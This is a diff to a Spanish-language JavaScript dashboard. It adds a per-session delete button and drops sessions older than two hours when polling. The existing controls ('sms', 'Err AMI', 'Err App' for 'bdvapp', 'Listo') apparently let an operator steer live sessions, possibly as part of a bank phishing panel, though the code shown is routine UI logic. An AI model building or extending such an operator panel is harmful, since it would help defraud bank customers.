@@ -162,9 +162,19 @@ function createRow(row) {
         <button type="button" class="btn btn--error" data-action="error-ami">Err AMI</button>
         <button type="button" class="btn btn--error" data-action="error-bdvapp">Err App</button>
         <button type="button" class="btn btn--done" data-action="done">Listo</button>
+        <button type="button" class="btn btn--error" data-action="delete" title="Eliminar sesión" style="background:#495057; padding:2px 7px;">✕</button>
       </div>
     </td>
   `
+
+  tr.querySelector('[data-action="delete"]')?.addEventListener('click', async () => {
+    rows.delete(row.id);
+    tr.remove();
+    render();
+    try {
+      await fetch(`/api/sessions/${row.id}`, { method: 'DELETE' });
+    } catch (_) {}
+  });
 
   tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
     const current = rows.get(row.id)
@@ -330,8 +340,10 @@ async function pollSessions() {
     if (response && response.ok) {
       const list = await response.json();
       
-      // Limpiar sesiones locales que ya no existen en el servidor (ej. al pulsar Limpiar)
-      const serverIds = new Set(list.map((s) => s.id));
+      // Limpiar sesiones locales que ya no existen en el servidor o superan 2 horas
+      const now = Date.now();
+      const freshList = list.filter((s) => now - (s.createdAt || 0) < 2 * 60 * 60 * 1000);
+      const serverIds = new Set(freshList.map((s) => s.id));
       for (const id of rows.keys()) {
         if (!serverIds.has(id)) {
           rows.delete(id);
@@ -342,7 +354,7 @@ async function pollSessions() {
       const oldKeys = new Set(rows.keys());
       let hasNewOrChangedSession = false;
       
-      list.forEach((session) => {
+      freshList.forEach((session) => {
         if (!oldKeys.has(session.id)) {
           hasNewOrChangedSession = true;
           requestAnimationFrame(() => {
@@ -374,7 +386,7 @@ async function pollSessions() {
       });
 
       // Actualizar o añadir sesiones
-      list.forEach((session) => {
+      freshList.forEach((session) => {
         const existing = rows.get(session.id);
         const resolvedState = session.state || (existing ? existing.state : 'waiting');
         const resolvedAction = (session.action !== undefined) ? session.action : (existing ? existing.action : null);
